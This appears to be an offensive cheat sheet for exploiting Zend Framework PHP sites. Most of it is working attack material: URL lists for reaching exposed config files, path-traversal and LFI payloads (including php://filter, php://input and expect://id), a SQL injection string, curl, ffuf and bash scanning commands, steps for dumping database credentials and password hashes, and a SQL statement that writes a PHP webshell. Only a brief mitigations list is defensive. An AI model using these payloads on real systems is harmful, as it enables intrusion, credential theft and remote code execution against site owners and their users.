## 1. Overview

**Zend Framework** is a PHP-based web application framework. Security issues typically arise from:

- **Exposed configuration files** containing database credentials, API keys, and secrets
- **Predictable file paths** following Zend's MVC structure
- **Debug mode leaks** revealing internal application details
- **Insecure deserialization** in older Zend versions
- **Local File Inclusion (LFI)** via routing misconfigurations

---

## 2. Detection Methods

### Quick Fingerprinting

**HTTP Headers:**

```
X-Powered-By: Zend Framework
```

**Common paths that reveal Zend:**

```
/application/
/public/
/library/Zend/
/vendor/zendframework/
```

**Look for Zend-specific files:**

```
/.zfproject.xml
/composer.json (check for "zendframework")
```

---

## 3. Exploitation Methods

### 3.1 Configuration File Exposure

**Target:** `application.ini` - Contains DB creds, API keys, salts

**Common locations to test:**

```
https://target.com/application/configs/application.ini
https://target.com/admin/configs/application.ini
https://target.com/config/application.ini
https://target.com/app/configs/application.ini
https://target.com/configs/application.ini
https://target.com/application/configs/config.ini
https://target.com/public/../application/configs/application.ini
```

**What to extract:**

- Database credentials (`resources.db.*`)
- Secret keys (`resources.session.save_path`, salt values)
- API tokens
- Email server credentials
- Debug settings

### 3.2 Path Traversal via Routing

**Test routing misconfigurations:**

```
https://target.com/../../application/configs/application.ini
https://target.com/public/index.php/../../application/configs/application.ini
https://target.com/index/../../application/configs/application.ini
```

**URL-encoded variants:**

```
https://target.com/%2e%2e%2f%2e%2e%2fapplication/configs/application.ini
https://target.com/..%5c..%5capplication/configs/application.ini
```

### 3.3 Debug Mode Information Disclosure

**Enable debug output via params:**

```
?XDEBUG_SESSION_START=1
?debug=1
?dev=1
?test=1
```

**Look for exposed error pages revealing:**

- Full file paths
- Database structure
- Framework version
- Internal IP addresses

### 3.4 Local File Inclusion (LFI)

**Test template/view parameters:**

```
/?view=../../../../etc/passwd
/?template=../../application/configs/application.ini
/?page=php://filter/convert.base64-encode/resource=application/configs/application.ini
```

### 3.5 Insecure Deserialization

**Older Zend versions (< 1.12.20) vulnerable to PHP object injection**

**Test serialized input in:**

- Cookies
- Hidden form fields
- Session data

**Basic payload structure:**

```php
O:8:"stdClass":1:{s:4:"test";s:5:"value";}
```

---

## 4. Bypasses

### 4.1 Directory Listing Bypass

If `/application/` returns 403:

```
/application/configs/
/application/models/
/application/views/scripts/
```

### 4.2 Extension Bypass

Try alternate extensions:

```
application.ini.bak
application.ini.old
application.ini~
application.ini.dist
application.ini.sample
```

### 4.3 Case Sensitivity Bypass

On Windows servers:

```
/APPLICATION/CONFIGS/application.ini
/Application/Configs/Application.ini
```

### 4.4 Null Byte Injection (PHP < 5.3.4)

```
/application/configs/application.ini%00.jpg
```

---

## 5. Top 10 Modern Payloads

### Config File Extraction

```bash
# Direct access
curl -s https://target.com/application/configs/application.ini

# Path traversal
curl -s https://target.com/public/../application/configs/application.ini

# PHP filter wrapper
curl -s "https://target.com/?file=php://filter/convert.base64-encode/resource=application/configs/application.ini"
```

### Automated Scanner

```bash
# Ffuf for config discovery
ffuf -u https://target.com/FUZZ/configs/application.ini -w /path/to/wordlist.txt -mc 200

# Nuclei template
nuclei -u https://target.com -t exposures/configs/zend-config-exposure.yaml
```

### Mass Check Script

```bash
#!/bin/bash
for path in application admin config app configs; do
    echo "[*] Testing: $path/configs/application.ini"
    curl -s -o /dev/null -w "%{http_code}" "https://target.com/$path/configs/application.ini"
done
```

### LFI Testing

```
/?view=....//....//....//etc/passwd
/?template=php://input
/?page=expect://id
```

### SQL Extraction via Debug

```
?debug=1&id=1' UNION SELECT 1,2,database()--
```

---

## 6. Higher Impact Scenarios

### 🔥 Database Takeover

**If you find `application.ini`:**

1. Extract DB credentials
2. Connect directly to database
3. Dump user tables
4. Extract password hashes
5. Check for admin accounts

**Command:**

```bash
mysql -h [db_host] -u [db_user] -p[db_pass] [db_name]
```

### 🔥 Session Hijacking

**Extract session save path:**

```ini
resources.session.save_path = "/tmp/sessions"
```

**Then attempt:**

- Predict session filenames
- LFI to read session files
- Forge admin sessions

### 🔥 Remote Code Execution Chain

**Path:** Config exposure → DB creds → Write webshell via SQL

```sql
SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/shell.php';
```

### 🔥 API Key Abuse

**Look for in config:**

```ini
api.key = "sk_live_..."
aws.secret = "..."
smtp.password = "..."
```

**Then:**

- Access third-party services
- Send emails as victim
- Access cloud resources

### 🔥 Source Code Disclosure

**Combine LFI + PHP wrappers:**

```
php://filter/convert.base64-encode/resource=application/controllers/IndexController.php
```

**Decode to read source code and find:**

- Hidden admin panels
- Hardcoded secrets
- Business logic flaws

---

## 7. Mitigations (For Reference)

- **Never expose `/application/` directory** - Move outside web root
- **Block direct access** via `.htaccess` or nginx rules
- **Disable debug mode** in production
- **Use environment variables** for secrets, not config files
- **Implement proper file permissions** (600 for configs)
- **Update framework** - Patch deserialization vulnerabilities
- **Validate routing inputs** - Prevent path traversal
- **Use security headers** - X-Content-Type-Options, CSP

---

## Quick Win Checklist ✅

- [ ] Test `/application/configs/application.ini`
- [ ] Try path traversal variations
- [ ] Check for backup config files (`.bak`, `.old`)
- [ ] Test debug parameters (`?debug=1`)
- [ ] Scan for LFI in template parameters
- [ ] Look for error messages revealing paths
- [ ] Check composer.json for version info
- [ ] Test session manipulation
- [ ] Attempt SQL injection with debug enabled
- [ ] Search for exposed `.git` directory

**Pro tip:** Always check `robots.txt` and `.htaccess` for blocked paths - they often reveal sensitive directories! 🎯